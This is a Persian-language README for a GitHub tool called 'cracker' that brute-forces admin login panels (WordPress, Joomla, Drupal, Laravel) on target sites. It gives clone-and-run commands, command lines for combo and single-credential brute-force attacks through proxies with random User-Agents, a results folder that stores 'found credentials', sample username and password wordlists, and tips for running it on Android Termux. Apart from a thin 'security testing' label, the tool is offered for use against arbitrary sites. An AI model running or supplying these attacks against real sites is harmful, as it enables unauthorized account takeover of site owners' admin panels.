# cracker
Site security testing and cracking panel(:

# install 
```
git clone https://github.com/silent-mimi/cracker.git
cd cracker
python wp-bug3.py
```
# mimi
```
🛡️ تست کامل امنیتی:

bash
python3 panel_cracker.py --url https://example.com --full
💣 حمله بروت فورس به وردپرس:

bash
python3 panel_cracker.py --url https://wordpress-site.com --panel wordpress --brute combo
🎯 تست تک Credential:

bash
python3 panel_cracker.py --url https://site.com --brute single --username admin --password Admin@123
🌐 استفاده از پروکسی:

bash
python3 panel_cracker.py --url https://target.com --full --proxy http://127.0.0.1:8080
📁 استفاده از وردلیست‌های سفارشی:

bash
python3 panel_cracker.py --url https://target.com --userlist my_users.txt --passlist my_passwords.txt --brute combo
4. ساختار فایل‌ها در Termux:
text
~/panel_cracker_results/
├── 📄 reports/              # گزارش‌های امنیتی
│   └── security_report_20240101_120000.txt
├── 📁 wordlists/           # لیست‌های پیش‌فرض
│   ├── default_usernames.txt
│   └── default_passwords.txt
├── 📋 logs/                # لاگ‌های اجرا
│   └── scan_20240101.log
├── 🔐 found_credentials/   # اطلاعات پیدا شده
│   ├── credentials_20240101_120000.txt
│   └── valid_users_20240101_120000.txt
└── 📸 screenshots/         # اسکرین‌شات‌ها (اختیاری)
5. ویژگی‌های کلیدی:
🔍 تشخیص خودکار پنل (وردپرس، جوملا، دروپال، لاراول، سفارشی)

💣 بروت فورس هوشمند با 4 حالت مختلف

📊 گزارش‌گیری پیشرفته با امتیازدهی امنیتی

🔄 مدیریت خودکار وردلیست (اگر فایل نبود از پیش‌فرض استفاده می‌کند)

🌐 پشتیبانی از پروکسی و User-Agent رندوم

📱 بهینه‌سازی کامل برای Termux اندروید

⚡ سرعت بالا با مدیریت صحیح Thread

💾 ذخیره‌سازی خودکار نتایج

🎨 رابط کاربری رنگی و زیبا

🛡️ بررسی ویژگی‌های امنیتی پنل

6. مثال وردلیست‌های سفارشی:
فایل users.txt:

text
admin
administrator
root
user1
user2
wpadmin
joomlaadmin
drupaladmin
فایل passwords.txt:

text
admin
Admin@123
password
Password@123
123456
P@ssw0rd
qwerty
letmein
7. نکات مهم برای Termux:
تأخیر مناسب: حداقل 1.5 ثانیه برای شبکه‌های موبایل

کارگران محدود: 3-5 کارگر همزمان برای عملکرد بهتر

ذخیره فضای کافی: نتایج در حافظه داخلی ذخیره می‌شوند

اجازه ذخیره‌سازی: termux-setup-storage را اجرا کنید

اتصال اینترنت پایدار: مهم برای تست‌های زمان‌بندی شده
